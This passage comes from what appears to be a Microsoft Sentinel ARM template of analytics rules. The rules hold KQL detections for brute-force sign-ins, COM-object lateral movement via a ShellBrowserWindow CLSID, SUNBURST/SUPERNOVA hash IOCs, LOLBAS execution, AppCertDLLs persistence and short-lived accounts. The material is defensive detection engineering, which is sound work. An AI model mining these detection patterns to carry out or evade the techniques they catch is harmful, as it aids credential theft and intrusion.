'|', LocationDetails.city)\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), make_set(ClientAppUsed,20), make_set(FullLocation,20), FailureCount = count() by IPAddress, AppDisplayName, UserPrincipalName, UserDisplayName, Identity, UserId, Type\n// lookup any unresolved identities\n| extend UnresolvedUserId = iff(Identity matches regex isGUID, UserId, \"\")\n| join kind= leftouter (\n identityLookup\n) on $left.UnresolvedUserId==$right.UserId\n| extend UserDisplayName=iff(isempty(lu_UserDisplayName), UserDisplayName, lu_UserDisplayName)\n| extend UserPrincipalName=iff(isempty(lu_UserPrincipalName), UserPrincipalName, lu_UserPrincipalName)\n| summarize StartTime = min(StartTime), EndTime = max(EndTime), make_set(UserPrincipalName,20), make_set(UserDisplayName,20), make_set(set_ClientAppUsed,20), make_set(set_FullLocation,20), make_list(FailureCount,20) by IPAddress, AppDisplayName, Type\n| extend FailedPrincipalCount = array_length(set_UserPrincipalName)\n) on IPAddress\n| project IPAddress, StartTime, EndTime, TargetedApplication=AppDisplayName, FailedPrincipalCount, UserPrincipalNames=set_UserPrincipalName, UserDisplayNames=set_UserDisplayName, ClientAppsUsed=set_set_ClientAppUsed, Locations=set_set_FullLocation, FailureCountByPrincipal=list_FailureCount, WindowThresholdBreaches, Type\n| join kind= inner (\ntable(tableName) // get data on success vs. failure history for each IP\n| where TimeGenerated > ago(timeRange)\n| where ResultType in(successCodes) or ResultType in(failureCodes) // success or failure types\n| summarize GlobalSuccessPrincipalCount = dcountif(UserPrincipalName, (ResultType in (successCodes))), ResultTypeSuccesses = make_set_if(ResultType, (ResultType in (successCodes))), GlobalFailPrincipalCount = dcountif(UserPrincipalName, (ResultType in (failureCodes))), ResultTypeFailures = make_set_if(ResultType, (ResultType in (failureCodes))) by IPAddress, Type\n| where GlobalFailPrincipalCount > GlobalSuccessPrincipalCount // where the number of failed principals is greater than success - eliminates FPs from IPs who authenticate successfully alot and as a side effect have alot of failures\n) on IPAddress\n| project-away IPAddress1\n| extend timestamp=StartTime\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "48607a29-a26a-4abf-8078-a06dbdd174a4",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.7"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/76259ac9-1fcc-449d-bb95-7aee921a8a46')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/76259ac9-1fcc-449d-bb95-7aee921a8a46')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Brute force attack against a Cloud PC",
          "description": "Identifies evidence of brute force activity against a Windows 365 Cloud PC by highlighting multiple authentication failures and by a successful authentication within a given time window.",
          "severity": "Medium",
          "enabled": true,
          "query": "let authenticationWindow = 20m;\nlet sensitivity = 2.5;\nSigninLogs\n| where AppDisplayName =~ \"Windows Sign In\"\n| extend FailureOrSuccess = iff(ResultType in (\"0\", \"50125\", \"50140\", \"70043\", \"70044\"), \"Success\", \"Failure\")\n| summarize FailureCount = countif(FailureOrSuccess==\"Failure\"), SuccessCount = countif(FailureOrSuccess==\"Success\"), IPAddresses = make_set(IPAddress,1000)\n                          by bin(TimeGenerated, authenticationWindow), UserDisplayName, UserPrincipalName\n| extend FailureSuccessDiff = FailureCount - SuccessCount\n| where FailureSuccessDiff > 0\n| summarize Diff = make_list(FailureSuccessDiff, 10000), TimeStamp = make_list(TimeGenerated, 10000) by UserDisplayName, UserPrincipalName//, tostring(IPAddresses)\n| extend (Anomalies, Score, Baseline) = series_decompose_anomalies(Diff, sensitivity, -1, 'linefit')  \n| mv-expand Diff to typeof(double), TimeStamp to typeof(datetime), Anomalies to typeof(double), Score to typeof(double), Baseline to typeof(long)\n| where Anomalies > 0\n| summarize by UserDisplayName, UserPrincipalName, Anomalies, Score, Baseline, FailureToSuccessDiff = Diff\n| join kind=leftouter (\n      SigninLogs\n      | where AppDisplayName =~ \"Windows Sign In\"\n      | extend OS = DeviceDetail.operatingSystem, Browser = DeviceDetail.browser\n      | extend StatusCode = tostring(Status.errorCode), StatusDetails = tostring(Status.additionalDetails)\n      | extend State = tostring(LocationDetails.state), City = tostring(LocationDetails.city)\n      | summarize StartTime = min(TimeGenerated), \n                  EndTime = max(TimeGenerated), \n                  IPAddresses = make_set(IPAddress,100), \n                  OS = make_set(OS,20), \n                  Browser = make_set(Browser,20), \n                  City = make_set(City,100), \n                  ResultType = make_set(ResultType,100)\n              by UserDisplayName, UserPrincipalName, UserId, AppDisplayName\n  ) on UserDisplayName, UserPrincipalName\n| project-away UserDisplayName1, UserPrincipalName1\n| extend IPAddressFirst = tostring(IPAddresses[0])\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "3fbc20a4-04c4-464e-8fcb-6667f53e4987",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "UserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddressFirst"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9415687b-538f-4c0c-8b9c-69ef17dc54a4')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9415687b-538f-4c0c-8b9c-69ef17dc54a4')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detecting Macro Invoking ShellBrowserWindow COM Objects",
          "description": "This query detects a macro invoking ShellBrowserWindow COM Objects evade naive parent/child Office detection rules.\nRef: https://blog.menasec.net/2019/02/threat-hunting-doc-with-macro-invoking.html",
          "severity": "Medium",
          "enabled": true,
          "query": "Event\n | where EventLog =~ \"Microsoft-Windows-Sysmon/Operational\" and EventID==1\n | parse EventData with * 'Image\">' Image \"<\" * 'CommandLine\">' CommandLine \"<\" * 'ParentImage\">' ParentImage \"<\" *\n | where ParentImage has \"svchost.exe\" and Image has \"rundll32.exe\" and CommandLine has \"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"\n | parse EventData with * 'ProcessGuid\">' ProcessGuid \"<\" * 'Description\">' Description \"<\" * 'CurrentDirectory\">' CurrentDirectory \"<\" * 'User\">' User \"<\" * 'LogonGuid\">' LogonGuid \"<\" * 'ParentProcessGuid\">' ParentProcessGuid \"<\" * 'ParentImage\">' ParentImage \"<\" * 'ParentCommandLine\">' ParentCommandLine \"<\" * 'ParentUser\">' ParentUser \"<\" *\n | summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by EventID, Computer, User, ParentImage, ParentProcessGuid, ParentCommandLine, ParentUser, Image, ProcessGuid, CommandLine, Description\n | extend HostName = iif(Computer has '.',substring(Computer,0,indexof(Computer,'.')),Computer) , DnsDomain = iif(Computer has '.',substring(Computer,indexof(Computer,'.')+1),'')\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [
            "T1021"
          ],
          "subTechniques": [
            "T1021.003"
          ],
          "alertRuleTemplateName": "e7470b35-0128-4508-bfc9-e01cfb3c2eb7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "CommandLine",
                  "columnName": "CommandLine"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "User"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/1ac7a567-8e86-4c1a-9668-b151be9e6bae')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/1ac7a567-8e86-4c1a-9668-b151be9e6bae')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SUNBURST and SUPERNOVA backdoor hashes",
          "description": "Identifies SolarWinds SUNBURST and SUPERNOVA backdoor file hash IOCs in DeviceFileEvents\nReferences:\n- https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\n- https://gist.github.com/olafhartong/71ffdd4cab4b6acd5cbcd1a0691ff82f",
          "severity": "High",
          "enabled": true,
          "query": "let SunburstMD5=dynamic([\"b91ce2fa41029f6955bff20079468448\",\"02af7cec58b9a5da1c542b5a32151ba1\",\"2c4a910a1299cdae2a4e55988a2f102e\",\"846e27a652a5e1bfbd0ddd38a16dc865\",\"4f2eb62fa529c0283b28d05ddd311fae\"]);\nlet SupernovaMD5=\"56ceb6d0011d87b6e4d7023d7ef85676\";\nDeviceFileEvents\n| where MD5 in(SunburstMD5) or MD5 in(SupernovaMD5)\n| extend HashAlgorithm = \"MD5\"\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence",
            "InitialAccess"
          ],
          "techniques": [
            "T1195",
            "T1059",
            "T1546"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a3c144f9-8051-47d4-ac29-ffb0c312c910",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingProcessAccountUpn"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingProcessAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingProcessAccountDomain"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "HashAlgorithm"
                },
                {
                  "identifier": "Value",
                  "columnName": "MD5"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.7"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3dbe9440-ba22-45e1-a3d3-c527c3d31333')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3dbe9440-ba22-45e1-a3d3-c527c3d31333')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Windows Binaries Executed from Non-Default Directory",
          "description": "The query detects Windows binaries, that can be executed from a non-default directory (e.g. C:\\Windows\\, C:\\Windows\\System32 etc.). \nRef: https://lolbas-project.github.io/",
          "severity": "Medium",
          "enabled": true,
          "query": "let procList = externaldata(Process:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Microsoft_Lolbas_Execution_Binaries.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nSecurityEvent\n| where EventID == 4688 and Process has_any (procList) and not (NewProcessName has (\"C:\\\\Windows\\\\\"))\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by EventID, Computer, SubjectUserName, NewProcessName, Process, CommandLine\n| extend Name=tostring(split(SubjectUserName, \"@\")[0]), UPNSuffix=tostring(split(SubjectUserName, \"@\")[1])\n| extend HostName = iif(Computer has '.',substring(Computer,0,indexof(Computer,'.')),Computer) , DnsDomain = iif(Computer has '.',substring(Computer,indexof(Computer,'.')+1),'')\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "15049017-527f-4d3b-b011-b0e99e68ef45",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "CommandLine",
                  "columnName": "CommandLine"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/39ea08cd-a7c4-40b9-8ab6-d957e96a3bfd')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/39ea08cd-a7c4-40b9-8ab6-d957e96a3bfd')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "External user added and removed in short timeframe",
          "description": "This detection flags the occurrences of external user accounts that are added to a Team and then removed within one hour.",
          "severity": "Low",
          "enabled": true,
          "query": "let TeamsAddDel = (Op:string){\nOfficeActivity\n| where OfficeWorkload =~ \"MicrosoftTeams\"\n| where Operation == Op\n| where Members has (\"#EXT#\")\n| mv-expand Members\n| extend UPN = tostring(Members.UPN)\n| where UPN has (\"#EXT#\")\n| project TimeGenerated, Operation, UPN, UserId, TeamName, ClientIP\n};\nlet TeamsAdd = TeamsAddDel(\"MemberAdded\")\n| project TimeAdded=TimeGenerated, Operation, MemberAdded = UPN, UserWhoAdded = UserId, TeamName, ClientIP;\nlet TeamsDel = TeamsAddDel(\"MemberRemoved\")\n| project TimeDeleted=TimeGenerated, Operation, MemberRemoved = UPN, UserWhoDeleted = UserId, TeamName, ClientIP;\nTeamsAdd\n| join kind=inner (TeamsDel) on $left.MemberAdded == $right.MemberRemoved\n| where TimeDeleted > TimeAdded\n| project TimeAdded, TimeDeleted, MemberAdded_Removed = MemberAdded, UserWhoAdded, UserWhoDeleted, TeamName, ClientIP\n| extend MemberAdded_RemovedAccountName = tostring(split(MemberAdded_Removed, \"@\")[0]), MemberAdded_RemovedAccountUPNSuffix = tostring(split(MemberAdded_Removed, \"@\")[1])\n| extend UserWhoAddedAccountName = tostring(split(UserWhoAdded, \"@\")[0]), UserWhoAddedAccountUPNSuffix = tostring(split(UserWhoAdded, \"@\")[1])\n| extend UserWhoDeletedAccountName = tostring(split(UserWhoDeleted, \"@\")[0]), UserWhoDeletedAccountUPNSuffix = tostring(split(UserWhoDeleted, \"@\")[1])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1136"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "bff093b2-500e-4ae5-bb49-a5b1423cbd5b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "MemberAdded_Removed"
                },
                {
                  "identifier": "Name",
                  "columnName": "MemberAdded_RemovedAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "MemberAdded_RemovedAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserWhoAdded"
                },
                {
                  "identifier": "Name",
                  "columnName": "UserWhoAddedAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UserWhoAddedAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserWhoDeleted"
                },
                {
                  "identifier": "Name",
                  "columnName": "UserWhoDeletedAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UserWhoDeletedAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ClientIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.1.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e4bc1528-e3b6-4b39-948d-e35bac8ca386')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e4bc1528-e3b6-4b39-948d-e35bac8ca386')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Registry Persistence via AppCert DLL Modification",
          "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. \nDynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec.\nRef: https://attack.mitre.org/techniques/T1546/009/",
          "severity": "Medium",
          "enabled": true,
          "query": "Event\n| where EventLog =~ \"Microsoft-Windows-Sysmon/Operational\" and EventID in (13)\n| parse EventData with * 'TargetObject\">' TargetObject \"<\" * 'Details\">' Details \"<\" * \n| where TargetObject has (\"\\\\Control\\\\Session Manager\\\\AppCertDLLs\\\\\")\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by EventID, Computer,  TargetObject, Details\n| extend HostName = iif(Computer has '.',substring(Computer,0,indexof(Computer,'.')),Computer) , DnsDomain = iif(Computer has '.',substring(Computer,indexof(Computer,'.')+1),'')\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1546"
          ],
          "subTechniques": [
            "T1546.009"
          ],
          "alertRuleTemplateName": "c61ad0ac-ad68-4ebb-b41a-74296d3e0044",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "RegistryKey",
              "fieldMappings": [
                {
                  "identifier": "Key",
                  "columnName": "TargetObject"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f57cba4f-52e9-4679-b74a-524271dfa7d3')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f57cba4f-52e9-4679-b74a-524271dfa7d3')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "AV detections related to Ukraine threats",
          "description": "This query looks for Microsoft Defender AV detections for malware observed in relation to the war in Ukraine.\n  Ref: https://msrc-blog.microsoft.com/2022/02/28/analysis-resources-cyber-threat-activity-ukraine/ ",
          "severity": "High",
          "enabled": true,
          "query": "let UA_threats = dynamic([\"FoxBlade\", \"WhisperGate\", \"Lasainraw\", \"SonicVote\", \"CaddyWiper\", \"AprilAxe\", \"FiberLake\", \"Industroyer\", \"DesertBlade\"]);\nSecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatFamilyName in~ (UA_threats)\n| extend HostName = tostring(split(CompromisedEntity, \".\")[0]), DomainIndex = toint(indexof(CompromisedEntity, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(CompromisedEntity, DomainIndex + 1), CompromisedEntity)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1485"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "b6685757-3ed1-4b05-a5bd-2cacadc86c2a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "CompromisedEntity"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/079b2080-a772-44dd-8455-3e4520efe202')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/079b2080-a772-44dd-8455-3e4520efe202')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Account Created and Deleted in Short Timeframe",
          "description": "Search for user principal name (UPN) events. Look for accounts created and then deleted in under 24 hours. Attackers may create an account for their use, and then remove the account when no longer needed.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#short-lived-account",
          "severity": "High",
          "enabled": true,
          "query": "let queryfrequency = 1h;\nlet queryperiod = 1d;\nAuditLogs\n| where TimeGenerated > ago(queryfrequency)\n| where OperationName =~ \"Delete user\"\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type == \"User\"\n      | extend TargetUserPrincipalName = extract(@'([a-f0-9]{32})?(.*)', 2, tostring(TargetResource.userPrincipalName))\n  )\n| extend DeletedByApp = tostring(InitiatedBy.app.displayName),\nDeletedByAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId),\nDeletedByUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName),\nDeletedByAadUserId = tostring(InitiatedBy.user.id),\nDeletedByIPAddress = tostring(InitiatedBy.user.ipAddress)\n| project Deletion_TimeGenerated = TimeGenerated, TargetUserPrincipalName, DeletedByApp, DeletedByAppServicePrincipalId, DeletedByUserPrincipalName, DeletedByAadUserId, DeletedByIPAddress, \nDeletion_AdditionalDetails = AdditionalDetails, Deletion_InitiatedBy = InitiatedBy, Deletion_TargetResources = TargetResources\n| join kind=inner (\n    AuditLogs\n    | where TimeGenerated > ago(queryperiod)\n    | where OperationName =~ \"Add user\"      \n    | mv-apply TargetResource = TargetResources on \n      (\n          where TargetResource.type == \"User\"\n          | extend TargetUserPrincipalName = trim(@'\"',tostring(TargetResource.userPrincipalName))\n      )\n    | project-rename Creation_TimeGenerated = TimeGenerated\n) on TargetUserPrincipalName\n| extend TimeDelta = Deletion_TimeGenerated - Creation_TimeGenerated\n| where  TimeDelta between (time(0s) .. queryperiod)\n| extend CreatedByApp = tostring(InitiatedBy.app.displayName),\nCreatedByAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId),\nCreatedByUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName),\nCreatedByAadUserId = tostring(InitiatedBy.user.id),\nCreatedByIPAddress = tostring(InitiatedBy.user.ipAddress)\n| project Creation_TimeGenerated, Deletion_TimeGenerated, TimeDelta, TargetUserPrincipalName, DeletedByApp, DeletedByAppServicePrincipalId, DeletedByUserPrincipalName, DeletedByAadUserId, DeletedByIPAddress, \nCreatedByApp, CreatedByAppServicePrincipalId, 